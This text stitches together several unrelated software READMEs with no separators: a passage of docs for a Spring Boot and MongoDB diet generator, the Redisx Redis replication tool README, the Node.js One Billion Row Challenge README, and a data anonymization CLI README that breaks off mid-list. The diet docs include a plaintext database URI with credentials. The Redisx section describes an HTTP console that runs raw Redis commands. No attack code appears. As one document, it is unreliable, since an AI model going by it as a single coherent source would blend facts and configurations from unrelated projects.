![Recipe List screenshot](/screenshots/recipe_list_ss.png)

First line `*` indicate the beginning of the list, followed by properties always in the same order, each properties need
to contain `:` and no space:

- Name (name of your recipe)
- HowTo (preparation steps)
- DietType (High Protein (the only supported diet right now))
- MealType (it can be list, each element separated by `/` sign. See domain layer for available meals)
- Scalable (true or false)

After properties list of products need to appear each in separate line enclosed by `**` from top and bottom line.
The format is as follows:

`name:grams/Filler`

The `name` in this format will be requested by the api. For `Filler` see the domain layer documentation. The `grams`
properties need to be given as integer.

The last line `***` indicate end of the recipe to parse.

The `NinjaApi` will fetch data using `RestClient`, provided by the Spring dependency library, from the CaloriesNinja api
and generate `NinjaReponse` that holds the list of `NinjaItems`.
First `NinjaItem` found in `NinjaResponse` will be mapped to the `Product` and saved to the database
using `ProductService`.

## 5.3 Persistence

This application utilize MongoDB which is easy to use NoSQL database. As Clean Architecture is used in this project,
each `@Document` has special implementation flow. Database connection configuration is very simple, it consists of one
line located in
`application.properties` file and `MongoDBConfiguration` class where packages is specified to scan. 

``` application.properties
spring.data.mongodb.uri=mongodb://fatatu:fatatu@mongo:27017/diet-generator?authSource=admin
```

```java
@Configuration
@EnableMongoRepositories(basePackages = ""org.ectimel.dietgenerator.infrastructure.persistance.mongo.repositories"")
public class MongoDBConfiguration {
}
```


Note that Docker Compose is used in this project, which means the uri address is service name
from `docker-compose.yaml`.

### 5.3.1 Documents

Currently, application has 2 main documents `ProductDocument` and `RecipeDocument`. I decided to use `UUID` as id in
each
document in this application. To achieve that, special abstract class `MongoUUIDEntity` that holds id as `UUID` type was
created.
It also contains setter method that is used during serialization if id is not presented.

```java

@Getter
@SuperBuilder
@NoArgsConstructor
public abstract class MongoUUIDEntity {

    @Id
    protected UUID id;

    public void setId(UUID id) {
        if (this.id != null) throw new UnsupportedOperationException(""ID is already defined"");

        this.id = id;
    }
}
```

[//]: # (![MongoUUID screenshot]&#40;/screenshots/mogouuid_ss.png&#41;)

Each actual document need to extend that class to provide `UUID` as ID. Special `@Component` is created that listen
for `BeforeConvertEvent` and will assign the UUID.

```java

@Component
public class UuidEntityEventListener extends AbstractMongoEventListener<MongoUUIDEntity> {

    @Override
    public void onBeforeConvert(BeforeConvertEvent<MongoUUIDEntity> event) {
        super.onBeforeConvert(event);
        MongoUUIDEntity mongoUUIDEntity = event.getSource();

        if (mongoUUIDEntity.getId() == null) {
            mongoUUIDEntity.setId(UUID.randomUUID());
        }
    }

```

### 5.3.2 Mappers

Each document need to have its own mapper that will map `@Document` to domain object and from domain to `@Document`.
This step is mandatory to separate domain and infrastructure layers. `DomainMapper` generic interface is created to be
implemented by actual mappers. Some inner classes that are used to represent data but are not actual `@Documents` also
needs mappers. For example `NutrientInformation` class.

```java
public interface DomainMapper<D, E> {
    D mapToDomain(E entityObject);

    E mapFromDomain(D domainObject);
}
```

[//]: # (![Domain Mapper screenshot]&#40;/screenshots/domain_mapper_ss.png&#41;)

### 5.3.3 Repositories

As mentioned before, the domain layer expose interfaces that need to be implemented to provide reading from and writing
to database.
Those repositories classes are prefixed with `Mongo` and suffixed with `Impl` and those classes are injected into
the `UseCases` that are registered by `BeanConfiguration` class.

To utilize SpringJDBC we need to perform additional step. For each `@Document` we need to create the interface that will
extend
`MongoRepository<T, ID>` interface. This repository extend `CrudRepository` and is adjusted to handle custom
mongo `@Query`. Those interfaces always have prefix `SpringDataMongo`

```java
public interface SpringDataMongoProductRepository extends MongoRepository<ProductDocument, UUID> {

    @Query(""{ 'name' : ?0 }"")
    Optional<ProductDocument> findByName(String name);

}
```

[//]: # (![Spring Data Repo screenshot]&#40;/screenshots/spring_data_repo_ss.png&#41;)

Once we have our interfaces we inject them in to the classes that implement exposed by domain layer interfaces to
actually perform writing to and reading from database.

```java

@Repository
@Qualifier(""mongoProductRepository"")
public class MongoProductRepositoryImpl implements ProductRepository {

    private final SpringDataMongoProductRepository productRepository;
    private final ProductMapper productMapper;

    public MongoProductRepositoryImpl(SpringDataMongoProductRepository productRepository, ProductMapper productMapper) {
        this.productRepository = productRepository;
        this.productMapper = productMapper;
    }

    @Override
    public Product save(Product product) {
        ProductDocument savedProduct = productRepository.save(productMapper.mapFromDomain(product));
        return productMapper.mapToDomain(savedProduct);
    }
}
```

[//]: # (![Mongo Impl Repo screenshot]&#40;/screenshots/mongo_impl_ss.png&#41;)

This way we keep our domain layer free from frameworks. To look at it from another angle see the diagram below.

# 6. Presentation

---

The presentation layer is responsible for handling user interface logic. It interacts with the user, displaying data and
capturing user input, and then communicates this data to the underlying application layers without containing any
business logic itself.

Currently, the application expose rest controllers to the user that can be used to perform some operations. Those
controllers are:
`CalculatorController`, `DietController`, `ProductController`, `RecipeController`. All controllers paths are prefixed
with
`/api/v1/` to indicate usage of api and the version.

For details please visit the [SWAGGER](link) documentation.

Each endpoint has its own response object, suffixed with `Response`. If endpoint is of type `POST` and
require `@RequestBody` object, it has dto object suffixed with `Request`. Every other dto object (inner objects) are
suffixed with `Dto`.

DTOs objects are used to transfer data to the user, we would like to avoid responds with domain objects. To achieve
these,
mappers classes ware created. Some, complex `Request` objects has built method mapToDomain() to simplify complexity.

```java
public DietAttributes mapToDomain() {
    return new DietAttributes(
            BigDecimal.valueOf(this.kcal()),
            DietType.fromValue(this.dietType()),
            BigDecimal.valueOf(this.numberOfMeals()),
            BigDecimal.valueOf(this.bodyWeightInKg()),
            Gender.stringToGender(this.gender()));
}
```

## 6.1 Controllers endpoints:

Most important is `DietController`, it expose one endpoint for diet generation:

`/api/v1/` with `POST` method.

```java

@PostMapping
public ResponseEntity<DietResponse> generateDiet(@Valid @RequestBody DietRequest dietRequest) {
    Diet diet = createDiet.createDiet(dietRequest.mapToDomain());
    return ResponseEntity.ok(dietMapper.mapToDietResponse(diet));
}
```

This endpoint require validated `DietRequest` dto and simple implementation in json format is presented below.

```json
{
  ""kcal"": ""3000"",
  ""dietType"": ""High Protein"",
  ""numberOfMeals"": ""5"",
  ""bodyWeightInKg"": 100,
  ""gender"": ""MALE""
}
```

It returns `DietResponse` object:

```java
public record DietResponse(List<DishDto> dishes, NutrientDto nutrition, Map<String, Double> shoppingList) {
}
```

The `CalculatorController` provide 2 endpoints.

`/api/v1/tdee` with `POST` method

```java

@PostMapping(""/tdee"")
public ResponseEntity<TDEEResponse> calculateTDEE(@RequestBody TDEERequest TDEERequest) {
    Double TDEE = TDEECalculator.calculateTDEE(TDEERequest.mapToDomain()).doubleValue();
    return ResponseEntity.ok(new TDEEResponse(TDEE + ""kcal""));
}
```

This endpoint require validated `TDEERequest` dto and simple implementation in json format is presented below.

```json
{
  ""bodyWeightInKg"": 120,
  ""heightInCm"": 174,
  ""age"": 30,
  ""gender"": ""maasdlae"",
  ""activityLevel"": ""MODERATELY""
}
```

`/api/v1/bmi` with `POST` method

```java

@PostMapping(""/bmi"")
public ResponseEntity<BMIResponse> calculateBMI(@RequestBody BMIRequest BMIRequest) {
    Double result = calculateBMI.calculate(
                    BigDecimal.valueOf(BMIRequest.bodyWeightInKg()),
                    BigDecimal.valueOf(BMIRequest.heightInCm()))
            .doubleValue();

    return ResponseEntity.ok(new BMIResponse(result));
}
```

This endpoint require validated `BMIRequest` dto and simple implementation in json format is presented below.

```json
{
  ""bodyWeightInKg"": 120,
  ""heightInCm"": 174
}
```

The `RecipeController` expose endpoint to fetch information about recipes.

`/api/v1/{recipeName}` with `GET` method and require path variable.

```java

@GetMapping(""/{recipeName}"")
public ResponseEntity<RecipeResponse> getProductByName(@PathVariable String recipeName) {
    List<Recipe> recipeList = recipeService.getRecipe(recipeName);
    List<RecipeDto> recipeDto = recipeList
            .stream()
            .map(recipeDtoMapper::mapFromDomain)
            .toList();
    return ResponseEntity.ok(new RecipeResponse(recipeDto));
}
```

The `ProductController` expose endpoint to fetch information about products.

`/api/v1/{productName}` with `GET` method and require path variable.

```java

@GetMapping(""/{productName}"")
public ResponseEntity<ProductResponse> getProductByName(@PathVariable String productName) {
    Product product = productService.getProduct(productName);
    ProductDto productDto = productDtoMapper.mapFromDomain(product);
    return ResponseEntity.ok(new ProductResponse(List.of(productDto)));
}
```

# 7. Docker

---

The application uses Docker and Docker Compose to simplyfy deployment and configuration on other machines.
The `docker-compose.yaml` consist of 4 services - mongo, mongo-express, spring-boot-app, and react-vite.
First two are database related services where mongo-express allows us to explore database using graphical user
interface.

Dockerfile for react application:

```dockerfile
FROM node:18.20.2-alpine

WORKDIR /app

COPY package.json .

RUN npm install -g npm@10.5.1
RUN npm install -g typescript
RUN npm install

COPY . .

RUN npm run build

EXPOSE 5173

CMD [ ""npm"", ""run"", ""preview"" ]
```

Dockerfile for Spring Boot app, note that it use multistage approach. First jar file is built, and secondly application
is started from that jar file.

```dockerfile
FROM maven:3.9 as BUILD
WORKDIR /app
COPY pom.xml /app
RUN mvn dependency:resolve
COPY . /app
RUN mvn clean
RUN mvn package -DskipTests -X

FROM amazoncorretto:21
COPY --from=BUILD /app/target/*.jar app.jar
EXPOSE 8080
CMD [""java"", ""-jar"", ""app.jar""]
```

## Redis stream replication tool Redisx

[![996.icu](https://img.shields.io/badge/link-996.icu-red.svg)](https://996.icu) 

English | [‰∏≠Êñá](https://github.com/970263611/redisx/blob/main/README-CN.md)

### Introduction to Redisx

Redis supports the From side single machine/sentinel'cluster mode, and the To sidesingle machine sentinel cluster mode can be freely combined„ÄÇ

- Supports Redis version2.8 and above
- Support high availability cluster deployment and vertical scaling
- Support full synchronization of RDB data and incremental synchronization of data
- Support for continued transmission
- Supports the five basic types of Redis + stream
- Support From and To dual end data queries, with the ability to reconnect in case of downtime
- Support timed exit for one-time synchronization

![redis-x-English](images/redis-x-English.png)

On a computer with a CPU of 13600KF and DDR5 64G memory (32G dual channel), 3 hosts and 3 slaves were set up in two Redis clusters. The boosting tool (30 concurrent) and Redis were run simultaneously. In the absence of a specific boot memory size, no server startup, and a JDK of 1.8 in Redis, the test results are as follows:

‚Äã                                             **Test the data transmission rate of Redisx**

### Author

Dahua team (see GitHub submitter for details),please pay attention to [material project](https://github.com/970263611/redisx-material) for Redis related materials.

### Definition

Redisx:The name of the stream replication tool.

From:The collective name of Redis end nodes for data sources.

To:The collective name of Redis end nodes for data storage.

### The startup environment 

Jdk1.8+

### Quick start

- Specify the configuration file method

  ```shell
  java -jar redisx.jar redisx.yml
  ```

- Use default configuration file method

  ```shell
  java -jar redisx.jar
  ```

redisx.yml Quick Start Configuration Example

```yaml
redisx:
  from:
    redis:
      version: 6.0.9  #Redis version
    password: 1a.2b*  #Redis password
    mode: cluster     #Redis mode,single sentinel cluster
    address:          #From Data source address, such as cluster or sentinel mode, can be configured with a single node
      - 127.0.0.1:6379
  to:
    password: 1a.2b*  #Redis password
    mode: cluster     #Redis mode,single sentinel cluster
    address:          #To Data source address, such as cluster or sentinel mode, can be configured with a single node
      - 127.0.0.1:6380
```

Redisx At startup, it supports passing parameters in the environment variable mode, which has higher priority than the configuration file mode

```shell
-Dredisx.from.password=1a.2b* -Dredisx.to.password=2b*1a.
```

### Availability

Redisx supports multi node primary and backup deployment.When multiple nodes start simultaneously and the switch flag (redisx. switchFlag)configuration is the same, it will automatically form a one master, multi slave primaryand backup mode. When the primary node is abnormal, the backup node willautomatically become the primary node, continue data synchronization work. and canresume transmission with breakpoints to ensure data integrity and continuity. At thispoint, the abnormal node will automatically downgrade after recovery.

#### Vertical Scaling

When there is a large amount of data in Redis cluster mode on the From side duringvertical expansion, there may be a delay in synchronizing the entire amount of datawith a Redis node. Therefore, Redis supports split synchronization, which can beconfigured to enable the Redis service to selectively synchronize certain From clusternodes. By starting different Redis nodes multiple times, synchronization can becovered to all From cluster nodes, greatly improving synchronization efficiency.

<img src=""images/highuse-English.png"" alt=""highuse-English"" style=""zoom:150%;"" />

#### Self-healing


The status of Redis nodes will not affect the operation of Redisx services. When Redis nodes experience abnormal phenomena such as service downtime or master node drift, Redisx can automatically select normal nodes and start/stop data synchronization work without worrying about the status of Redis nodes on the From/To side, which may affect Redis.

### Data writing mode

##### Default Mode

The default mode is to submit offset data at a frequency of once per second, with 50 data per 100milliseconds submitted to the To cluster. This mode has a high throughput and ismutually exclusive with the Strong Consistency mode.

##### Strong consistency mode

 After each data 1s written to the To cluster, it is forciblysynchronized with an offset. This mode has high stability and is mutually exclusivewith the default mode.

##### The forced full synchronization data mode

The forced full synchronization data mode forces full synchronization of all data information from the master/slave every time it is started. There may be a small initial delay in large data volumes, but data idempotency can be guaranteed. This mode is not mutually exclusive with other modes.

### Service Monitoring

The Redisx page monitoring function can display the real-time working status of Redis and Redisx nodes, Redisx's data synchronization speed, data accumulation, and configuration information. At the same time, we are gradually improving the alarm function of Redisx.

![](images/monitor.png)

##### Data query capability

Note: Production startup is not recommended, and port access is not recommended

```shell
http://${ip}:${port}/console?command=${command}&type=from/to   
#'command' is a specific instruction, 'type' is To query Redis data From the source, and To query Redis data From the source
For exampleÔºö
http://localhost:9999/console?command=get testKey&type=from
http://localhost:9999/console?command=get testKey&type=to
```

#### Recommended scene configuration

The data volume difference in the following data difference description refers to the problem of inconsistent keys (more From, less To) and inconsistent values (duplicate List data content) in the data

##### Data Strong Consistent Synchronization Scenario

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
    alwaysFullSync: true
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
    flushDb: true #When redisx.for.alwaysFullSync is true, this configuration will take effect every time it synchronizes
```

Function Description

1.Strong consistency of data, strict requirement for From and To end data to be completely consistent

2.Priority is given to connecting From nodes on the From end, and there is no way to select the master

3.No longer interrupt the continuation, perform full synchronization every time

No data difference

**Note **:This mode will clear the To data and resynchronize the From data in every abnormal scenario. There may be short-term data inconsistency on the To side, and full data synchronization requires bandwidth resources. If there is a unique key on the To end, this mode cannot be used, and after stopping the From end during disaster recovery switching, the Redisx service also needs to be stopped

##### Scenario of synchronizing large amounts of data

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
```

Function Description

1.Efficient synchronization, batch submission, data submission and offset refresh for a single To node every 50 pieces of data or with a maximum interval of 100 milliseconds

2.Priority is given to connecting From nodes on the From end, and there is no way to select the master

3.Interrupt synchronization when Redis service is abnormal, and automatically start synchronization when Redis service is normal

4.Support synchronization of existing RDB data and support interruption and continuation of transmission

Data discrepancy description (may only occur in abnormal situations)

1.Any node on the From end fails or Redis is shut down normally (kill), with no data difference

2.A single To end master node failure may result in a data difference of no more than the product of the To quantity and redisx.to.flushSize

3.Redisx may experience a data difference of no more than the product of the number of To end master nodes and redisx.to.flushSize by forcing an interrupt (kill -9)

##### The data volume is small, but there is a high requirement for consistency

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  immediate:
    enable: true
```

Function Description

1.Low efficiency, single submission, single To node performs data submission and I/O operation result confirmation for every 1 data, offset refresh and result confirmation

2.Priority is given to connecting From nodes on the From end, and there is no way to select the master

3.Interrupt synchronization when Redis service is abnormal, and automatically start synchronization when Redis service is normal

4.Support synchronization of existing RDB data and support interruption and continuation of transmission

Data discrepancy description (may only occur in abnormal situations)

1.Any node on the From end fails or Redis is shut down normally (kill), with no data difference

2.A single To end master node failure may result in a difference in data volume not exceeding the number of To end Redis master nodes

3.Redis may experience a data volume difference of no more than the number of Redis master nodes on the To side through forced interrupts (kill -9)

##### Cluster mode, with a huge amount of data, requires extremely high synchronization efficiency

Group: Refers to a collection of nodes with the same redisx.switchFlag configuration

Redisx Group1Ôºö

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - From node1
      ...
    verticalScaling: true
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  switchFlag: REDISX-...Each group of Redisx services must be inconsistent, and the primary and backup Redisx services within the same group must be consistent
```

Redisx Group2:

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - From node2
      ...
    verticalScaling: true
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  switchFlag: REDISX-...Each group of Redisx services must be inconsistent, and the primary and backup Redisx services within the same group must be consistent
```

Function Description

1.Only synchronize the From node data in the configuration, without extending to the entire From cluster data

2.Select only configuration nodes From the end

3.Interrupt synchronization when Redis service is abnormal, and automatically start synchronization when Redis service is normal

4.Support synchronization of existing RDB data and support interruption and continuation of transmission

Data discrepancy description (may only occur in abnormal situations)

1.Any node on the From end fails or Redis is shut down normally (kill), with no data difference

2.A single To end master node failure may result in a difference in data volume not exceeding the number of To end Redis master nodes

3.Redis may experience a data volume difference of no more than the number of Redis master nodes on the To side through forced interrupts (kill -9)

##### One time synchronization/Timed synchronization

```yaml
redisx:
  from:
    redis:
      version: x.x.x
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  to:
    mode: cluster
    password: 1a.2b*
    address:
      - xxx.xxx.xxx.xxx:port
      ...
  timedExit:
    enable: true
    force: true  #Whether to enable interrupt compensation and whether the accumulated data in the queue is fully synchronized during the interrupt;Default false
    duration: 1000   #How long does it close, in seconds
```

Function Description

1.The synchronization efficiency is the same as the regular mode or strong consistency mode, and it will automatically shut down after the set running time

2.Priority is given to connecting From nodes on the From end, and there is no way to select the master

3.Interrupt synchronization when Redis service is abnormal, and automatically start synchronization when Redis service is normal

4.Support synchronization of existing RDB data

No data difference

The One Billion Row Challenge (1BRC) is a fun exploration of how far modern Java can be pushed for aggregating one billion rows from a text file.

Later the community created a dedicated @1brc organization to pay more attention to the implementations in other languages. This repository contains and accepts Node.js based implementations.

Grab all your (virtual) threads, reach out to SIMD, optimize your GC, or pull any other trick, and create the fastest implementation for solving this task!

<img src=""1brc.png"" alt=""1BRC"" style=""display: block; margin-left: auto; margin-right: auto; margin-bottom:1em; width: 50%;"">

The text file contains temperature values for a range of weather stations.
Each row is one measurement in the format `<string: station name>;<double: measurement>`, with the measurement value having exactly one fractional digit.
The following shows ten rows as an example:

```
Hamburg;12.0
Bulawayo;8.9
Palembang;38.8
St. John's;15.2
Cracow;12.6
Bridgetown;26.9
Istanbul;6.2
Roseau;34.4
Conakry;31.2
Istanbul;23.0
```

The task is to write a program which reads the file, calculates the min, mean, and max temperature value per weather station, and emits the results on stdout like this
(i.e. sorted alphabetically by station name, and the result values per station in the format `<min>/<mean>/<max>`, rounded to one fractional digit):

```
{Abha=-23.0/18.0/59.2, Abidjan=-16.2/26.0/67.3, Ab√©ch√©=-10.0/29.4/69.0, Accra=-10.1/26.4/66.4, Addis Ababa=-23.7/16.0/67.0, Adelaide=-27.8/17.3/58.5, ...}
```

Submit your implementation and become part of the leaderboard!

See [below](#entering-the-challenge) for instructions how to enter the challenge with your own implementation.

## Prerequisites

1. [Java 21](https://openjdk.org/projects/jdk/21/) to generate the `measurements.txt` files and optionally run tests.
2. Node.js, preferably via nvm (node version manager) must be installed on your system.

## Running the Challenge

This repository contains two programs:

- `dev.morling.onebrc.CreateMeasurements` (invoked via _create_measurements.sh_): Creates the file _measurements.txt_ in the root directory of this project with a configurable number of random measurement values
- `src/main/nodejs/baseline/index.js` (invoked via _calculate_average_baseline.sh_): Calculates the average values for the file _measurements.txt_

Execute the following steps to run the challenge:

1. Build the project using Apache Maven:

   ```
   ./mvnw clean verify
   ```

2. Create the measurements file with 1B rows (just once):

   ```
   ./create_measurements.sh 1000000000
   ```

   This will take a few minutes.
   **Attention:** the generated file has a size of approx. **12 GB**, so make sure to have enough diskspace.

3. Calculate the average measurement values:

   ```
   ./calculate_average_baseline.sh
   ```

   The provided naive example implementation uses the Node.js Streams for processing the file and completes the task in ~6m16s on environment used for [result evaluation](#evaluating-results).
   It serves as the base line for comparing your own implementation.

4. Optimize the heck out of it:

   Adjust the `src/main/nodejs/baseline/index.js` program to speed it up, in any way you see fit (just sticking to a few rules described below).
   Options include parallelizing the computation, memory-mapping different sections of the file concurrently, choosing and tuning the garbage collector, and much more.

## Flamegraph/Profiling

> TODO: add instructions on how to profile node.js programs

## Rules and limits

- No external library dependencies may be used
<!-- - Implementations must be provided as a single source file -->
- The computation must happen at application _runtime_, i.e. you cannot process the measurements file at _build time_
  and just bake the result into the binary
- Input value ranges are as follows:
  - Station name: non null UTF-8 string of min length 1 character and max length 100 bytes (i.e. this could be 100 one-byte characters, or 50 two-byte characters, etc.)
  - Temperature value: non null double between -99.9 (inclusive) and 99.9 (inclusive), always with one fractional digit
- There is a maximum of 10,000 unique station names
- Implementations must not rely on specifics of a given data set, e.g. any valid station name as per the constraints above and any data distribution (number of measurements per station) must be supported

## Entering the Challenge

To submit your own implementation to 1BRC, follow these steps:

- Create a fork of the [1brc/nodejs](https://github.com/1brc/nodejs/) GitHub repository.
- Create a copy of `src/main/nodejs/baseline` directory, rename it to `src/main/nodejs/<your_GH_user>`, e.g. `src/main/nodejs/JohnDoe`.
- Make that implementation fast. Really fast.
- Create a copy of _calculate_average_baseline.sh_, named _calculate_average\_<your_GH_user>.sh_, e.g. _calculate_average_JohnDoe.sh_.
- Adjust that script so that it references your implementation file. If needed, provide any Node.js/V8 runtime arguments.
  Make sure that script does not write anything to standard output other than calculation results.
- Run the test suite by executing _/test.sh <your_GH_user>_; if any differences are reported, fix them before submitting your implementation.
- Create a pull request against the upstream repository, clearly stating
  - The execution time of the program on your system and specs of the same (CPU, number of cores, RAM). This is for informative purposes only, the official runtime will be determined as described below.
- I will run the program and determine its performance as described in the next section, and enter the result to the scoreboard.

**Note:** I reserve the right to not evaluate specific submissions if I feel doubtful about the implementation (I.e. I won't run your Bitcoin miner ;).

<!-- If you'd like to discuss any potential ideas for implementing 1BRC with the community,
you can use the [GitHub Discussions](https://github.com/gunnarmorling/onebrc/discussions) of this repository.
Please keep it friendly and civil. -->

## Evaluating Results

For now results are determined by running the program on a Apple MacBook M1 32GB (10 physical).
The `time` program is used for measuring execution times, i.e. end-to-end times are measured.
Each contender will be run five times in a row.
The slowest and the fastest runs are discarded.
The mean value of the remaining three runs is the result for that contender and will be added to the results table above.
The exact same _measurements.txt_ file is used for evaluating all contenders.

<!-- If you'd like to spin up your own box for testing on Hetzner Cloud, you may find these [set-up scripts](https://github.com/gunnarmorling/cloud-boxes/) (based on Terraform and Ansible) useful.
It has been reported that instances of the CCX33 machine class can significantly vary in terms of performance,
so results are only comparable when obtained from one and the same instance.
Note this will incur cost you are responsible for, I am not going to pay your cloud bill :) -->

<!-- ## Prize

If you enter this challenge, you may learn something new, get to inspire others, and take pride in seeing your name listed in the scoreboard above.
Rumor has it that the winner may receive a unique 1Ô∏è‚É£üêùüèéÔ∏è t-shirt, too! -->

## FAQ

<!-- _Q: Can I use Kotlin or other JVM languages other than Java?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share implementations significantly outperforming any listed results, though.

_Q: Can I use non-JVM languages and/or tools?_\
A: No, this challenge is focussed on Java only. Feel free to inofficially share interesting implementations and results though. For instance it would be interesting to see how DuckDB fares with this task.

_Q: I've got an implementation‚Äîbut it's not in Java. Can I share it somewhere?_\
A: Whilst non-Java solutions cannot be formally submitted to the challenge, you are welcome to share them over in the [Show and tell](https://github.com/gunnarmorling/1brc/discussions/categories/show-and-tell) GitHub discussion area.

_Q: Can I use JNI?_\
A: Submissions must be completely implemented in Java, i.e. you cannot write JNI glue code in C/C++. You could use AOT compilation of Java code via GraalVM though, either by AOT-compiling the entire application, or by creating a native library (see [here](https://www.graalvm.org/22.0/reference-manual/native-image/ImplementingNativeMethodsInJavaWithSVM/). -->

_Q: What is the encoding of the measurements.txt file?_\
A: The file is encoded with UTF-8.

_Q: Can I make assumptions on the names of the weather stations showing up in the data set?_\
A: No, while only a fixed set of station names is used by the data set generator, any solution should work with arbitrary UTF-8 station names
(for the sake of simplicity, names are guaranteed to contain no `;` character).

_Q: Can I copy code from other submissions?_\
A: Yes, you can. The primary focus of the challenge is about learning something new, rather than ""winning"". When you do so, please give credit to the relevant source submissions. Please don't re-submit other entries with no or only trivial improvements.

_Q: Which operating system is used for evaluation?_\
A: macOS Sonoma 14 (see [Evaluating Results](#evaluating-results))

_Q: My solution runs in 2 sec on my machine. Am I the fastest 1BRC-er in the world?_\
A: Probably not :) 1BRC results are reported in wallclock time, thus results of different implementations are only comparable when obtained on the same machine. If for instance an implementation is faster on a 32 core workstation than on the 8 core evaluation instance, this doesn't allow for any conclusions. When sharing 1BRC results, you should also always share the result of running the baseline implementation on the same hardware.

_Q: Why_ 1Ô∏è‚É£üêùüèéÔ∏è _?_\
A: It's the abbreviation of the project name: **One** **B**illion **R**ow **C**hallenge.

### What is the data anonymization application? 

The data anonymization application is a command-line tool designed to safeguard sensitive data. 
It achieves this by masking of the sensitive data within an enterprise's relational database.
The anonymization reduces risk of unintended disclosure of the sensitive data while still keeping it useful for
business processing. The European Union's General Data Protection Regulation (GDPR) requires that stored data 
on people in the EU undergo either anonymization or a pseudonymization process.

### What is a sensitive data? 

Sensitive information is whatever data that can be linked or attributed to a specific person, company or client.
Examples of sensitive information include data about customers: company name, names of official representatives,
phones, emails, addresses, credit cards, birth dates, medical information.

### Why sensitive data should be kept secure?

Securing sensitive data is crucial for every digital business. 
When sensitive information about customers is leaked to the public, it can result in direct and indirect 
losses for the company, including reputational and financial damage.

### Anonymization approach

In the data protection application, anonymization is accomplished through a data masking approach.
This technique involves replacing sensitive values, such as personal identification numbers, credit card numbers, social security numbers, 
and email addresses, with fictitious or randomized values. 
Importantly, this process ensures that the structure and, potentially, the semantic meaning of the data are preserved while safeguarding its confidentiality..

### How does the application work?

The dataprotection application retrieves data from a relational database, performs anonymization on it, 
and writes it back to the database. 
Anonymization is done according to rules specified in a transformation configuration file. 
The transformation configuration file outlines which specific columns in the database schema and 
tables should be anonymized, as well as how - as identified by identifier of anonymizer to use.

### What anonymizers are available?

Currently, the following anonymizers are available, with the possibility of additional ones being introduced in the future.
Displayed on the left is the ID of each anonymizer, which should be specified in the transformation YAML file. 

**name** - the anonymizer replaces alphabetic letters with random alternatives while preserving the initial letters<br/>
**email** - changes email address to a randomly looking one<br/>
**address** - the anonymizer that obfuscates however preserves the appearance of addresses by maintaining spaces and punctuation marks while obscuring the underlying data<br/>
**birthdate** - the date anonymizer generates a new random date, effectively changing the original date<br/>
**ccard** - the credit card anonymizer replaces credit card numbers with randomly generated ones<br/>
**pid** - a basic ""one-size-fits-all"" anonymizer capable of handling various personal identification codes, social security numbers, and tax payer numbers<br/>
**post** - the post code anonymizer replaces post codes with alternative values sourced from the same column in the database<br/>
**ip** - the ip address anonymizer replaces ip address with another random ip address<br/>

### Setup

This is a console application which requires Java 19 (which should be downloaded and setup separately).
After java 19 is installed, set JAVA_HOME to the corresponding folder, e.g.  

`export JAVA_HOME=~/.jdks/corretto-19.0.2`

The application can be built using `mvnw package` command run in the project folder.

It will build zip packages for windows and linux and place it into `target` folder.
After unpacking one of the packages you should be able to run the `dp.sh` script with arguments as shown below.

### Configuration

* **conf/application.properties** file should be used to set up DB connection URL and credentials.
  This (the only) DB will be used for anonymization and data analysis. <br/>
* **AnonymizerTable.java** - (optionally) for registering a custom anonymizer <br/>
* **columnToAnonymizer.properties** (optionally) - the file is used when adding new anonymizer and using it for auto-detection of columns
  in database for anonymization.

### How to add a custom anonymizer

* Add a new anonymizer class (with test) to com.discreet.dataprotection.anonymizer package. Extend it either from BaseAnonymizer or CharSequenceAnonymizer.
* Register the anonymizer class with corresponding alias in AnonymizerTable.java
* Use anonymizer alias as a value mapped to db column in transformations.yaml file.
* (Optionally) for using anonymizer in auto-detection process, map it to corresponding column name in columnToAnonymizer.properties

### Autodetection of senstitive data

The application autonomously identifies which database columns are suitable for anonymization by leveraging metadata information about the database. 
This information can be provided in two ways: through a Data Definition Language (DDL) file containing statements used to create data tables in a database schema, or via a direct connection to the database schema.

### Running the application

Application can be started used supplied script: dp.bat for windows or dp.sh for Linux or MacOS.
The application requires Java 19 (or newer version), which should be installed separately.
Upon execution without arguments, the application provides information about available command line arguments. 
At the moment the application works in 2 modes: ""transform"" and ""detect"", each represented by corresponding 
command and related options:

* **transform** </br>
  _anonymize database_ 
  * -tfn, --transformationsFileName=[transformationsFileName] </br>
  _yaml file describing for each schema/table how each column should be anonymized_
* **detect** </br>
  _auto detect what schema tables and columns in a given columns can be anonymized. The result is a temporary 
transformations.yaml file which can be later used with ""transform"" command._
  * -dbe, --dbEngine=[dbEngine] </br>
  _one of mysql, oracle, postgresql, db2, jtds, sybase, sqlserver, mariadb, derby, hive, h2, informix_
  * -dsn, --defaultSchemaName=[defaultSchemaName] </br>
  _name to use in case if schema name is missing in DDL schema_
  * -iid, --ignoreMissingIds </br>
  _ignore db tables with missing or not detected id columns_
  * -sfn, --schemaFileName=[schemaFileName] </br>
  _ddl schema file name to use for auto-detection of DB table columns which can be anonymized_
  * -sn, --schemaName=[schemaName] </br>
  _schema name to use for reading metadata from DB and auto-detection of DB table columns which can be anonymized_

### Use cases

**1a.** Auto-detect data eligible for anonymization using supplied DDL schema file:

`./dp.sh detect -dbe mysql -dsn test -sfn schema.sql -iid`

- it will automatically identify database columns in the schema that likely require anonymization. 
Subsequently, it will generate a transformation.yaml file, which can be further refined through post-processing (manual editing) and subsequently utilized for actual anonymization. 
It's important to note that at this stage, no data in the database schema is altered.
